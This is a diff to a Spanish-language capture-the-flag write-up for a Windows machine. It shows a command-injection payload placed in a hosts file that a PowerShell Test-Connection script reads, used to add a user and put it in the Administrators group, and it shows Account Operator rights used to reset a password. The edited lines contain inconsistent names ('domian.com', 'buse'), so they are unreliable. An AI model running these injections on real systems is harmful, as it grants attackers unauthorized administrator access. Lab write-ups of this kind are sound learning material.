@@ -530,9 +530,9 @@ Es decir cualquier cosa que lee del archivo va a ser interpretada por powershell
 ```
 Test-Connection -ComputerName CMD -Count 1 -ea silentlycontinue
 ```
-Asi que podemos hacer lo siguiente con añadir ";net user bleu bleupassword /add;net localgroup Administrators bleu /add" al archivo de los hosts
+Asi que podemos hacer lo siguiente con añadir "domain.com;net localgroup Administrators bleu /add" al archivo de los hosts
 ```
-Test-Connection -ComputerName ;net user bleu bleupassword /add;net localgroup Administrators bleu /add -Count 1 -ea silentlycontinue
+Test-Connection -ComputerName domian.com;net localgroup Administrators buse /add -Count 1 -ea silentlycontinue
 ```
 Obstaculo: no somos brytany
 Fortaleza: Somos BUILTIN\Account Operators
@@ -540,6 +540,9 @@ Fortaleza: Somos BUILTIN\Account Operators
 Siendo Account Operator podemos modificar la contraseña de bryttany y ser bryttany:
 ```
 net user brittanycr Pass4321 /domain
+net user bleu Amazn2gPass_26 /add
 ```
-No podemos entrar usando el WinRm pero si en SMBClient entramos y desde ahi editamos el host.txt añadiendo lo que queremos, solo nos falta que se ejecute para poder acceder como nuestro usuario
+No podemos entrar usando el WinRm pero si en SMBClient entramos y desde ahi editamos el host.txt añadiendo lo que queremos, luego solo nos falta que se ejecute para poder acceder como nuestro usuario a /Administrator
+
+
 
